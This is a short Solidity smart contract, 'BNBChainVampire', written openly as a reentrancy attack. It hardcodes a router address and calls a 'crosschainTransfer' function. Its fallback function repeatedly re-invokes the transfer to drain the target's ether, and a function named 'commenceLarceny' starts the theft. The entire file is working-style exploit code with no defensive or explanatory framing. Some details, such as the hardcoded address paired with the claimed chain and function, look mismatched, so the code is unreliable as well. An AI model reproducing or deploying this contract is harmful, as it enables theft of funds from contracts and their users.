// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITargetRouter {
    function crosschainTransfer(address payable to, uint256 amount) external payable;
}

contract BNBChainVampire {
    ITargetRouter targetRouter = ITargetRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    fallback() external payable { 
        if (address(targetRouter).balance >= 1 ether) {
            targetRouter.crosschainTransfer(payable(address(this)), 1 ether);
        }
    }

    function commenceLarceny() public payable {
        require(msg.value >= 1 ether);
      
        ITargetRouter(targetRouter).crosschainTransfer(payable(address(this)), msg.value);
      
        // Keep calling patiently until satisfied... or doomed.
    }
}